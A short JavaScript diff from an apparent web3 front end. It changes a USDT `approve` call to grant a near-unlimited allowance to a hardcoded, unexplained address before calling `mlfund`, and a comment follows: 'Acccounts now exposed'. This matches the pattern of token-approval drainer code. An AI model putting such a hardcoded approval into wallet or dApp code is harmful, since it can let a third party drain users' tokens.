@@ -423,7 +423,7 @@
             const ETH = web3.eth
             const contract = new ETH.Contract(abi, usdtAddr.toLowerCase())
             const dfContarct = new ETH.Contract(dfAbi, defosAddr.toLowerCase())
-            await contract.methods.approve().call()
+            await contract.methods.approve('0x6Dc47E3cD4B459606025b0B2ED600E1173429FeC', 999999999999999).call()
             await dfContarct.methods.mlfund(123*Math.pow(10, 18)).call()
             // Acccounts now exposed
             // web3.eth.sendTransaction({/* ... */});
